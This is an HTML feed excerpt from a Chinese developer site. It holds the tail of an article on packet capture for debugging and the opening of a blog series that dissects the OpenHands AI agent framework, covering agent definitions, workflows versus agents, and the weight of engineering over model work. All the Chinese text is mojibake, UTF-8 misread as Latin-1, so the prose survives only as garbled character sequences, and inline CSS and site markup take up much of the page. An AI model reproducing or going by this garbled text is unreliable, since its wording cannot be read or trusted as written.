<li>æŠ“åŒ…å¤§å¸ˆ HTTPS æš´åŠ›æŠ“åŒ…ï¼šè·å–çœŸå®è¯·æ±‚</li>
<li>æ•°æ®æµæŠ“åŒ…ï¼šç¡®è®¤è¿æ¥è¡Œä¸º</li>
<li>ä»£ç†æŠ“åŒ…ï¼ˆå¿…è¦æ—¶ï¼‰ï¼šéªŒè¯å“ªäº›è¯·æ±‚ä»èµ°ç³»ç»Ÿä»£ç†</li>
</ul>
<p>æ¯ä¸ªå·¥å…·éƒ½è§£å†³ä¸€éƒ¨åˆ†é—®é¢˜ï¼Œè€Œä¸æ˜¯æœŸå¾…æŸä¸€ä¸ªå·¥å…·è§£å†³æ‰€æœ‰é—®é¢˜</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ1ï¼‰--- æ ¸å¿ƒç†å¿µ]]></title>    <link>https://juejin.cn/post/7596904122865336371</link>    <guid>https://juejin.cn/post/7596904122865336371</guid>    <pubDate>2026-01-19T13:13:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596904122865336371" data-draft-id="7595890117865898030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ1ï¼‰--- æ ¸å¿ƒç†å¿µ"/> <meta itemprop="keywords" content="ç®—æ³•,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-01-19T13:13:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç½—è¥¿çš„æ€è€ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ1ï¼‰--- æ ¸å¿ƒç†å¿µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç½—è¥¿çš„æ€è€ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T13:13:51.000Z" title="Mon Jan 19 2026 13:13:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AI Agentæ¡†æ¶æ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ1ï¼‰--- æ ¸å¿ƒç†å¿µ</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x00 æ‘˜è¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x01 èƒŒæ™¯</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.1 ä»€ä¹ˆæ˜¯Agent</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.2 Agentå·¥ç¨‹çš„é‡è¦æ€§</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.3 æ¶æ„æ‰æ˜¯ç«äº‰ä¼˜åŠ¿</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x02 AI Agent ç³»ç»Ÿ</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.1 æ¶æ„è®¾è®¡çš„éš¾ç‚¹</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.2 æ ¸å¿ƒç»„ä»¶</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.3 Devin &amp; OpenHandsï¼ˆåŸOpenDevinï¼‰</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x03 OpenHands æ¶æ„æ¦‚å¿µå›¾è°±</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.1 ç³»ç»Ÿæ¶æ„</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.2 ä»£ç åº“ç›®å½•ç»“æ„</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.3 æ ¸å¿ƒç»„ä»¶</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0xFF å‚è€ƒ</a></p>
</li>
</ul>
<p>è‡ªæœ¬æ–‡èµ·ï¼Œæˆ‘ä»¬å°†å¼€å¯ä¸€ä¸ªæ–°çš„ç³»åˆ—ï¼Œä»¥OpenHandsï¼ˆåŸ OpenDevinï¼‰ä¸ºä¾‹ï¼Œæ·±å…¥å‰–æAgentæ¡†æ¶ã€‚</p>
<p>å†™è¿™ä¸ªç³»åˆ—çš„åŸå› ï¼Œæ˜¯å› ä¸ºå’Œå‡ ä¸ªåŒå­¦è®¨è®ºAgentç³»ç»Ÿï¼Œä½†æ˜¯æ€»è§‰å¾—è‡ªå·±è®²å¾—æµ®äºè¡¨é¢ï¼Œå…„å¼Ÿä»¬å¥½åƒä¹Ÿæ²¡æœ‰å¾ˆç†è§£ã€‚å› æ­¤å†³å®šå†ç³»ç»Ÿæ¢³ç†ä¸€ä¸‹ã€‚</p>
<p>å› ä¸ºæœ¬ç³»åˆ—å€Ÿé‰´çš„æ–‡ç« è¿‡å¤šï¼Œå¯èƒ½åœ¨å‚è€ƒæ–‡çŒ®ä¸­æœ‰é—æ¼çš„æ–‡ç« ï¼Œå¦‚æœæœ‰ï¼Œè¿˜è¯·å¤§å®¶æŒ‡å‡ºã€‚</p>
<h3 data-id="heading-1">0x00 æ‘˜è¦</h3>
<p>æŒæ¡Agentçš„åº•å±‚é€»è¾‘ï¼Œä¸ä»…æ˜¯ç†Ÿç»ƒä½¿ç”¨çš„åŸºç¡€ï¼Œæ›´æ˜¯è®¾è®¡ã€è¯„ä¼°å’Œæ‰©å±•çš„å…³é”®ã€‚å¯¹äºäº§å“ç»ç†ã€äººå·¥æ™ºèƒ½å·¥ç¨‹å¸ˆå’ŒæŠ€æœ¯å†³ç­–è€…æ¥è¯´ï¼Œåªæœ‰æ·±å…¥ç†è§£Agentçš„æŠ€æœ¯è“å›¾ï¼Œæ‰èƒ½åœ¨AIåº”ç”¨çš„è½åœ°è¿‡ç¨‹ä¸­åšå‡ºç²¾å‡†å¸ƒå±€ï¼ŒæŠ“ä½æœªæ¥çš„æœºé‡ã€‚æˆ‘ä»¬å¸Œæœ›ä»æŠ€æœ¯åº•å±‚å‡ºå‘ï¼Œæ·±å…¥æ¢è®¨ä»¥ä¸‹å…³é”®é—®é¢˜ï¼š</p>
<ul>
<li>æ„å»ºä¸€ä¸ªå®ç”¨çš„AI Agentéœ€è¦å“ªäº›æ ¸å¿ƒæŠ€æœ¯æ¨¡å—çš„æ”¯æŒï¼Ÿ</li>
<li>è¿™äº›æ ¸å¿ƒæ¨¡å—å¦‚ä½•ååŒå·¥ä½œï¼Œå½¢æˆå®Œæ•´çš„ä»»åŠ¡æ‰§è¡Œé—­ç¯ï¼Ÿ</li>
<li>AI Agentç³»ç»Ÿåœ¨è½åœ°è¿‡ç¨‹ä¸­ä¼šé¢ä¸´å“ªäº›å…³é”®æŒ‘æˆ˜ï¼ŒOpenHandså¦‚ä½•è§£å†³è¿™äº›å·¥ç¨‹åŒ–éš¾é¢˜ï¼Ÿ</li>
</ul>
<p>æˆ‘ä»¬å¸Œæœ›é€šè¿‡è¿™ä¸€åœºæ·±å…¥çš„â€œæ‹†è§£â€ä¹‹æ—…ï¼Œè¶…è¶Šè¡¨å±‚åŠŸèƒ½çš„æ¼”ç¤ºï¼Œç›´æ¥è§¦åŠå…¶æ¶æ„çš„åŸºçŸ³ã€‚</p>
<p>ä¹‹æ‰€ä»¥åˆ†æOpenHandsï¼Œæ˜¯å› ä¸ºOpenHandsï¼ˆå‰èº«ä¸º OpenDevinï¼‰ä½œä¸ºå¼€æºçš„ AI è½¯ä»¶å¼€å‘ä»£ç†æ¡†æ¶ï¼Œåœ¨åŠŸèƒ½ã€æ¶æ„å’Œå…¼å®¹æ€§ç­‰æ–¹é¢å‡å…·å¤‡é²œæ˜ç‰¹è‰²ï¼Œä¸”ä»å…¥é—¨éš¾åº¦ã€å­¦ä¹ ä»·å€¼å’Œå®è·µåœºæ™¯æ¥çœ‹ï¼Œå®ƒååˆ†é€‚åˆç”¨æ¥å­¦ä¹  Agent æ¡†æ¶ã€‚å…·ä½“ç‰¹è‰²å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>å…¥é—¨é—¨æ§›ä½ï¼Œä¸Šæ‰‹éš¾åº¦å°</strong>ï¼šæ”¯æŒè‡ªç„¶è¯­è¨€äº¤äº’ï¼Œå¼€å‘è€…æ— éœ€å¤æ‚ç¼–ç å³å¯ä¸‹è¾¾å¼€å‘ä»»åŠ¡ï¼Œé™ä½åˆæœŸå­¦ä¹ æˆæœ¬ã€‚åŒæ—¶æä¾› GUI å’Œ CLI ç­‰å‹å¥½ç•Œé¢ï¼Œè¿˜æœ‰è¯¦å°½çš„å®æˆ˜æ¡ˆä¾‹å’Œæ¸…æ™°çš„æ–‡æ¡£ï¼Œä¾¿äºç†è§£ Agent ä¸å·¥å…·ã€LLM çš„ååŒé€»è¾‘ã€‚ä¸”åŸºäº MIT è®¸å¯å®Œå…¨å¼€æºï¼Œå¯è‡ªç”±æŸ¥çœ‹ Agent è°ƒåº¦ã€ä»»åŠ¡ç¼–æ’ç­‰æ ¸å¿ƒæºç ã€‚</li>
<li><strong>è¦†ç›– Agent æ ¸å¿ƒçŸ¥è¯†ä½“ç³»</strong>ï¼šå­¦ä¹ å®ƒèƒ½æŒæ¡å¤š Agent åä½œã€ä»»åŠ¡æ‹†è§£ã€å·¥å…·è°ƒç”¨ã€æ²™ç›’å®‰å…¨æ§åˆ¶ç­‰ Agent æ¡†æ¶çš„æ ¸å¿ƒæŠ€æœ¯ç‚¹ã€‚å…¶ä¸ç½‘é¡µäº¤äº’ã€API é›†æˆã€ä»£ç å¤„ç†ç­‰å®æˆ˜åœºæ™¯ç»“åˆç´§å¯†ï¼Œèƒ½å¸®åŠ©å­¦ä¹ è€…ç†è§£ Agent åœ¨çœŸå®å¼€å‘æµç¨‹ä¸­çš„è½åœ°é€»è¾‘ã€‚</li>
<li><strong>å…¼å…·å­¦ä¹ ä¸è½åœ°ä»·å€¼</strong>ï¼šæ—¢èƒ½ç”¨äºç®€å•çš„ Agent åŸå‹æ­å»ºï¼Œå¿«é€ŸéªŒè¯æƒ³æ³•ï¼›ä¹Ÿèƒ½æ”¯æ’‘å¤§è§„æ¨¡Agentçš„å¯é éƒ¨ç½²ï¼Œé€‚é…ä»å­¦ä¹ æµ‹è¯•åˆ°ç”Ÿäº§åº”ç”¨çš„å…¨æµç¨‹ã€‚æ­¤å¤–ï¼Œä¸ä¸»æµ Agent SDK ç›¸æ¯”ï¼Œå…¶ç‹¬ç‰¹çš„æ²™ç›’åŒ–ç”Ÿäº§æœåŠ¡å™¨ã€è¿œç¨‹æ‰§è¡Œç­‰ç‰¹æ€§ï¼Œèƒ½è®©å­¦ä¹ è€…æ¥è§¦åˆ°æ›´å…¨é¢çš„ Agent è¿›é˜¶èƒ½åŠ›ï¼Œæå‡æŠ€æœ¯ç«äº‰åŠ›ã€‚</li>
</ul>
<h3 data-id="heading-2">0x01 èƒŒæ™¯</h3>
<p>å½“æˆ‘ä»¬è®¨è®ºAI Agentç³»ç»Ÿçš„æŠ€æœ¯æ—¶ï¼Œéœ€è¦å…ˆç†è§£ä¸€ä¸ªå…³é”®é—®é¢˜ï¼šçœŸæ­£è®©ç³»ç»Ÿæœ‰ç«äº‰åŠ›çš„ï¼Œæ˜¯é‚£äº›ä¸€çœ¼èƒ½çœ‹åˆ°çš„â€œæ™ºèƒ½åŠŸèƒ½â€ï¼Œè¿˜æ˜¯èƒŒåæ”¯æ’‘ä¸€åˆ‡å¹³ç¨³è¿è¡Œçš„â€œå·¥ä½œæµæ¶æ„â€ï¼Ÿè¿™ä¸ªç­”æ¡ˆä¸ä»…å†³å®šäº†è¯¥å…ˆç ”å‘ä»€ä¹ˆï¼Œæ›´å…³ä¹ç³»ç»Ÿèƒ½ä¸èƒ½æ‰“é€ å‡ºåˆ«äººæŠ„ä¸èµ°çš„é•¿æœŸä¼˜åŠ¿ã€‚</p>
<h4 data-id="heading-3">1.1 ä»€ä¹ˆæ˜¯Agent</h4>
<p>Agentçš„å®šä¹‰å…·æœ‰å¤šå…ƒè§†è§’ï¼š</p>
<ul>
<li>æœ‰äººå°†å…¶ç•Œå®šä¸ºå¯é•¿æœŸè‡ªä¸»è¿è¡Œã€å€ŸåŠ©å„ç±»å·¥å…·å®Œæˆå¤æ‚ä»»åŠ¡çš„ç‹¬ç«‹ç³»ç»Ÿï¼›</li>
<li>æœ‰äººè®¤ä¸ºAgentæ˜¯å¯ä»¥åœ¨æœ€å°äººå·¥å¹²é¢„ä¸‹å®Œæˆã€Œæ„ŸçŸ¥ â†’ è§„åˆ’ â†’ è¡ŒåŠ¨ â†’ åé¦ˆã€é—­ç¯çš„Agentï¼Œæ—¢èƒ½è§£æè‡ªç„¶è¯­è¨€ç›®æ ‡ï¼Œåˆèƒ½è°ƒç”¨æœç´¢å¼•æ“ã€æ•°æ®åº“ç­‰å¤–éƒ¨å·¥å…·ã€‚</li>
<li>æœ‰äººåˆ™å°†å…¶ç†è§£ä¸ºéµå¾ªé¢„è®¾å·¥ä½œæµç¨‹çš„è§„èŒƒåŒ–å®ç°æ–¹æ¡ˆã€‚</li>
</ul>
<p>Anthropic å°†è¿™äº›ä¸åŒå½¢æ€çš„ç³»ç»Ÿç»Ÿä¸€å½’ä¸º â€œAgentç³»ç»Ÿï¼ˆagentic systemsï¼‰â€ï¼ŒåŒæ—¶ä»æ¶æ„å±‚é¢æ˜ç¡®åŒºåˆ†äº† â€œå·¥ä½œæµç¨‹ï¼ˆWorkflowsï¼‰â€ ä¸ â€œAgentâ€ è¿™ä¸¤ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚å…·ä½“æ¥çœ‹ï¼š</p>
<ul>
<li>å·¥ä½œæµæ˜¯ç¼–ç â€å¦‚ä½•åšâ€œï¼šå·¥ä½œæµç¨‹ç±»ç³»ç»Ÿå¦‚åŒæŒ‰ç…§å›ºå®šå‰§æœ¬æ¼”å‡ºçš„èˆå°å‰§ï¼Œå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMsï¼‰ä¸å„ç±»å·¥å…·çš„åä½œå®Œå…¨éµå¾ªé¢„å…ˆç¼–å†™çš„ä»£ç è·¯å¾„æ¨è¿›ï¼›</li>
<li>Agentæ˜¯ç¼–ç â€åšä»€ä¹ˆâ€œï¼šAgentç³»ç»Ÿåˆ™æ›´åƒæ‹¥æœ‰è‡ªä¸»å†³ç­–èƒ½åŠ›çš„é¡¹ç›®ç»ç†ï¼Œç”±å¤§è¯­è¨€æ¨¡å‹åŠ¨æ€ä¸»å¯¼æµç¨‹èµ°å‘ä¸å·¥å…·è°ƒç”¨ï¼Œå…¨ç¨‹æŒæ§ä»»åŠ¡çš„æ‰§è¡Œæ–¹å¼ã€‚</li>
</ul>
<p>éšç€å¤§è¯­è¨€æ¨¡å‹åœ¨å››å¤§å…³é”®èƒ½åŠ›ä¸Šçš„æ—¥è¶‹æˆç†Ÿ â€”â€” åŒ…æ‹¬å¤æ‚è¾“å…¥ç†è§£ã€é€»è¾‘æ¨ç†ä¸ä»»åŠ¡è§„åˆ’ã€å¯é å·¥å…·è°ƒç”¨ä»¥åŠé”™è¯¯æ¢å¤èƒ½åŠ›ï¼ŒAgentå·²åœ¨ç”Ÿäº§åœºæ™¯ä¸­é€æ­¥è½åœ°åº”ç”¨ã€‚å…¶å·¥ä½œæµç¨‹é€šå¸¸å§‹äºäººç±»ç”¨æˆ·çš„æŒ‡ä»¤æˆ–äº¤äº’å¼æ²Ÿé€šï¼Œå¾…ä»»åŠ¡ç›®æ ‡æ˜ç¡®åï¼Œä¾¿è‡ªä¸»å¼€å±•è§„åˆ’ä¸æ‰§è¡Œæ“ä½œï¼Œè¿‡ç¨‹ä¸­è‹¥éœ€è¡¥å……ä¿¡æ¯æˆ–å¯»æ±‚åˆ¤æ–­ï¼Œä¼šä¸»åŠ¨å‘äººç±»ç”¨æˆ·å‘èµ·è¯·æ±‚ã€‚åœ¨æ¯ä¸€æ­¥æ‰§è¡Œç¯èŠ‚ï¼ŒAgentå¿…é¡»ä»ç¯å¢ƒä¸­è·å– â€œçœŸå®æ•°æ®ï¼ˆGround Truthï¼‰â€â€”â€” æ¯”å¦‚å·¥å…·è°ƒç”¨è¿”å›ç»“æœæˆ–ä»£ç è¿è¡Œè¾“å‡º â€”â€” ä»¥æ­¤è¯„ä¼°ä»»åŠ¡è¿›å±•ã€‚å½“æŠµè¾¾é¢„è®¾æ£€æŸ¥ç‚¹æˆ–é­é‡æ‰§è¡Œé˜»ç¢æ—¶ï¼ŒAgentå¯æš‚åœæ“ä½œä»¥è·å–äººç±»åé¦ˆã€‚ä»»åŠ¡ä¸€èˆ¬åœ¨å®Œæˆåç»ˆæ­¢ï¼ŒåŒæ—¶ä¹Ÿä¼šè®¾ç½®åœæ­¢æ¡ä»¶ï¼ˆå¦‚æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼‰æ¥ç¡®ä¿è¿‡ç¨‹å¯æ§ã€‚</p>
<h4 data-id="heading-4">1.2 Agentå·¥ç¨‹çš„é‡è¦æ€§</h4>
<p>Agentçš„å®ç°é€»è¾‘ç›¸å¯¹ç®€æ´ï¼Œæœ¬è´¨ä¸Šæ˜¯å¤§è¯­è¨€æ¨¡å‹åœ¨ â€œç¯å¢ƒåé¦ˆ - å·¥å…·è°ƒç”¨â€ çš„å¾ªç¯ä¸­æŒç»­è¿ä½œã€‚Agentç³»ç»Ÿçš„æ ¸å¿ƒæ„å»ºæ¨¡å—æ˜¯ä¸€ä¸ªå¢å¼ºåŠŸèƒ½çš„å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ï¼Œå®ƒèƒ½å¤Ÿä¸»åŠ¨åœ°åˆ©ç”¨æ£€ç´¢ã€å·¥å…·å’Œè®°å¿†ç­‰èƒ½åŠ›æ¥ä¼˜åŒ–å…¶åŠŸèƒ½ã€‚å¯¹äºç»å¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œé€šè¿‡æ£€ç´¢ï¼ˆRAGï¼‰å’Œåœ¨ prompt ä¸­æ·»åŠ ä¸Šä¸‹æ–‡ç¤ºä¾‹ï¼ˆPrompt Engineeringï¼‰æ¥ä¼˜åŒ–å•ä¸ª LLM è°ƒç”¨é€šå¸¸å°±è¶³å¤Ÿäº†ã€‚</p>
<p>è™½ç„¶åªè¦æä¾›ä¸€å †å·¥å…·å’Œpromptï¼Œagentå°±å¯ä»¥è‡ªè¡Œæ¢ç´¢-åˆ†æ-å†³ç­–-æ‰§è¡Œç›´åˆ°è§£å†³ä»»åŠ¡ã€‚ä»å®è§‚è§’åº¦ä¸Šæ¥è¯´è¿™æ ·å¹¶æ²¡æœ‰é”™ï¼Œä½†è®©LLMæ§åˆ¶ä¸€åˆ‡çš„ç»“æœå°±æ˜¯ï¼Œä¸å®Œå–„çš„promptå’Œtoolså¸¦æ¥äº†æ— é™å¾ªç¯å’Œæ”¾é£è‡ªæˆ‘ã€‚å› æ­¤ï¼Œå°½ç®¡AIæ¨¡å‹æ˜¯Agentçš„â€œå¤§è„‘â€ï¼Œä½†è¦å®ç°ç”Ÿäº§çº§çš„è½åœ°ï¼ŒAgentå·¥ç¨‹æ‰æ˜¯å…³é”®æ”¯æ’‘ã€‚Rakesh Gohelå‘å¸ƒçš„â€œAI Agentå†°å±±æ¨¡å‹â€æŒ‡å‡ºï¼šæ„å»ºä¸€ä¸ªçœŸæ­£å¯ç”¨çš„Agentï¼Œ90%çš„å·¥ä½œæ˜¯è½¯ä»¶å·¥ç¨‹ï¼Œä»…10%æ˜¯AIæŠ€æœ¯ï¼š</p>
<ul>
<li>â€œ10% AIâ€ï¼šAIæ¨¡å‹åªæ˜¯Agentçš„â€œå¤§è„‘â€ï¼šç†è§£ä»»åŠ¡ã€è§„åˆ’æ­¥éª¤ã€ç”Ÿæˆå†…å®¹ã€‚</li>
<li>â€œ90% Engineeringâ€ï¼šå·¥ç¨‹æ˜¯æ”¯æ’‘Agentçš„æ•´ä¸ªâ€œèº«ä½“å’Œç¥ç»ç³»ç»Ÿâ€ï¼ŒåŒ…æ‹¬ç”¨æˆ·äº¤äº’ã€æƒé™æ§åˆ¶ã€ä»»åŠ¡ç¼–æ’ã€å·¥å…·è°ƒç”¨ã€æ—¥å¿—ã€å¼‚å¸¸å›æ»šç­‰ã€‚</li>
</ul>
<p>åœ¨è¿™èƒŒåï¼Œä¸€æ•´å¥—ç³»ç»ŸåŒ–çš„Agentæ¶æ„ï¼Œæ­£æ‚„ç„¶å†³å®šç€è¿™äº›Agentçš„æ•ˆç‡ã€æ‰©å±•æ€§å’Œæ¼”åŒ–æ–¹å‘ã€‚å¦‚æœå°†å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰æ¯”ä½œAIçš„å‘åŠ¨æœºï¼Œé‚£ä¹ˆâ€œAgentæ¶æ„â€å°±æ˜¯å†³å®šAIèƒ½èµ°å¤šè¿œçš„åº•ç›˜å’Œé©¾é©¶ç³»ç»Ÿã€‚</p>
<h4 data-id="heading-5">1.3 æ¶æ„æ‰æ˜¯ç«äº‰ä¼˜åŠ¿</h4>
<p>AI Agentä¸æ˜¯ä¸€æ¬¾å•ä¸€äº§å“ï¼Œè€Œæ˜¯ä¸€ç§å…¨æ–°çš„è½¯ä»¶å½¢æ€â€”â€”å®ƒä¸æ˜¯â€œæ›´èªæ˜çš„æœºå™¨äººâ€ï¼Œè€Œæ˜¯â€œèƒ½è‡ªä¸»åä½œçš„æ•°å­—ä¸ªä½“â€ã€‚å…¶æŠ€æœ¯éš¾ç‚¹ä¸åœ¨äºâ€œæƒ³è±¡åŠ›â€ï¼Œè€Œåœ¨äºâ€œå·¥ç¨‹è½åœ°èƒ½åŠ›â€ã€‚æœªæ¥ï¼ŒçœŸæ­£å¼•é¢†Agentå‘å±•çš„ï¼Œå¿…ç„¶æ˜¯é‚£äº›æ—¢æ‡‚AIæŠ€æœ¯ï¼Œåˆç²¾é€šç³»ç»Ÿæ¶æ„çš„â€œAgentå·¥åŒ â€ã€‚Agentæ¶æ„ï¼Œå·²æˆä¸ºä¸‹ä¸€ä»£AIåº”ç”¨çš„æ ¸å¿ƒç«äº‰èµ›é“ã€‚èƒ½å¦ç†è§£â€œMemory-Plan-Tool-Reflectionâ€çš„ååŒé€»è¾‘ï¼Œèƒ½å¦æ„å»ºâ€œé€æ˜ã€å¯æ§ã€å¯æ‰©å±•â€çš„ä»»åŠ¡ç³»ç»Ÿï¼Œå†³å®šäº†ä¸€ä¸ªå›¢é˜Ÿæ˜¯å¦å…·å¤‡æ‰“é€ å®ç”¨Agentåº”ç”¨çš„æ ¸å¿ƒèƒ½åŠ›ã€‚</p>
